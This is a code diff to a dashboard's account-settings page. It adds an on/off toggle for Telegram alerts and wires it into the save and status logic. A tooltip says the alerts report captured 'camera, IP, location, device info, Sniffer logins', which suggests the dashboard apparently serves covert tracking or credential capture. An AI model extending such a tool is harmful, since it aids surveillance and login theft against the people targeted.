@@ -106,6 +106,14 @@ dashboard_shell_begin('Account settings', 'settings', $userNavName, $userNavInit
                             <label for="telegram_chat_id">Chat ID</label>
                             <input type="text" id="telegram_chat_id" name="telegram_chat_id" autocomplete="off" placeholder="@username or -1001234567890">
 
+                            <div class="settings-toggle-row">
+                                <span class="settings-toggle-label" id="telegramEnableLabel">Enable</span>
+                                <label class="toggle" title="Receive Telegram alerts (camera, IP, location, device info, Sniffer logins)">
+                                    <input type="checkbox" id="telegram_enabled" class="toggle-input" checked aria-labelledby="telegramEnableLabel">
+                                    <span class="toggle-track"><span class="toggle-thumb"></span></span>
+                                </label>
+                            </div>
+
                             <p class="settings-alert" id="telegram_settings_error" role="alert" hidden></p>
                             <p class="settings-success" id="telegram_settings_ok" role="status" hidden></p>
 
@@ -142,13 +150,14 @@ dashboard_shell_begin('Account settings', 'settings', $userNavName, $userNavInit
                         tabNotify.addEventListener('click', function () { activateTab('notifications'); });
 
                         var statusEl = document.getElementById('telegram_config_status');
+                        var enableEl = document.getElementById('telegram_enabled');
                         var tokEl = document.getElementById('telegram_bot_token');
                         var chatEl = document.getElementById('telegram_chat_id');
                         var errEl = document.getElementById('telegram_settings_error');
                         var okEl = document.getElementById('telegram_settings_ok');
                         var saveBtn = document.getElementById('telegram_save_btn');
                         var testBtn = document.getElementById('telegram_test_btn');
-                        if (!statusEl || !tokEl || !chatEl || !errEl || !okEl || !saveBtn || !testBtn) return;
+                        if (!statusEl || !enableEl || !tokEl || !chatEl || !errEl || !okEl || !saveBtn || !testBtn) return;
 
                         function setErr(msg) {
                             if (msg) {
@@ -167,10 +176,16 @@ dashboard_shell_begin('Account settings', 'settings', $userNavName, $userNavInit
                             setErr('');
                         }
 
-                        function setStatus(configured) {
-                            statusEl.textContent = configured
-                                ? 'Status: configured on server (token and chat ID loaded below).'
-                                : 'Status: not configured — enter a bot token and chat ID, then Save.';
+                        function setStatus(configured, enabled) {
+                            if (!configured) {
+                                statusEl.textContent = 'Status: not configured — enter a bot token and chat ID, then Save.';
+                                return;
+                            }
+                            if (enabled) {
+                                statusEl.textContent = 'Status: configured — Telegram notifications are on.';
+                            } else {
+                                statusEl.textContent = 'Status: configured — notifications are paused (Enable is off). Turn Enable on and Save to resume.';
+                            }
                         }
 
                         async function loadTelegramConfig() {
@@ -180,8 +195,11 @@ dashboard_shell_begin('Account settings', 'settings', $userNavName, $userNavInit
                                 if (data.status === 'success' && data.configured && data.bot_token && data.chat_id) {
                                     tokEl.value = data.bot_token;
                                     chatEl.value = data.chat_id;
-                                    setStatus(true);
+                                    var on = data.enabled !== false;
+                                    enableEl.checked = on;
+                                    setStatus(true, on);
                                 } else {
+                                    enableEl.checked = true;
                                     setStatus(false);
                                 }
                             } catch (e) {
@@ -202,7 +220,11 @@ dashboard_shell_begin('Account settings', 'settings', $userNavName, $userNavInit
                                 var res = await fetch(API + '?action=telegram', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ bot_token: token, chat_id: chat }),
+                                    body: JSON.stringify({
+                                        bot_token: token,
+                                        chat_id: chat,
+                                        enabled: enableEl.checked
+                                    }),
                                     credentials: 'same-origin'
                                 });
                                 var data = await res.json().catch(function () { return {}; });
@@ -210,7 +232,7 @@ dashboard_shell_begin('Account settings', 'settings', $userNavName, $userNavInit
                                     setErr(data.message || 'Could not save');
                                     return;
                                 }
-                                setStatus(true);
+                                setStatus(true, enableEl.checked);
                                 setOk(data.message || 'Telegram config saved.');
                             } catch (err) {
                                 setErr('Network error — try again');
